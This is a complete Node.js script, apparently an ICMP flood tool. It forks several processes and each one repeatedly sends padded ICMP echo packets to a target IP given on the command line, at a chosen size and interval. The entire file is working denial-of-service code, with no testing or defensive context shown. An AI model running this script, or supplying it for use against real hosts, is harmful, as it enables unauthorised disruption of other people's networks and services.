const raw = require('raw-socket');
const child_process = require('child_process');
const path = require('path');

if (process.argv.length < 6) {
  console.log('node icmp.js <target_ip> <bytes> <sleep_time> <process_num>');
  process.exit(-1);
}

var target_ip = process.argv[2];
var bytes = parseInt(process.argv[3]);
var sleep_time = parseInt(process.argv[4]);
var process_num = parseInt(process.argv[5]);
var processes_list = [];

if (!process.argv[6]) {
  for (let i = 0; i < process_num - 1; i++) {
    processes_list.push(child_process.fork(path.join(__dirname, 'icmp.js'), [target_ip, bytes, sleep_time, process_num, 'child']));
  }
  process.on('message', (msg) => {
    if (msg === 'die') {
      process.exit();
    }
  });
}

process.on('SIGINT', () => {
  for (let i in processes_list) {
    processes_list[i].send('die');
  }
  process.exit();
});

var buffer = Buffer.from('0800000000010a09' + '61'.repeat(bytes), 'hex');

raw.writeChecksum(buffer, 2, raw.createChecksum(buffer));

var socket = raw.createSocket({ protocol: raw.Protocol.ICMP });

socket.on('close', function () {
  console.log('Socket closed');
  process.exit(-1);
});

socket.on('error', function (error) {
  console.log('Error: ' + error.toString());
  process.exit(-1);
});

function icmp() {
  socket.send(buffer, 0, buffer.length, target_ip, function (error, bytes) {
    if (error) {
      console.log(error.toString());
    } else {
      console.log('Sent ' + (bytes - 8) + ' bytes to ' + target_ip);
    }
  });
}

setInterval(icmp, sleep_time);
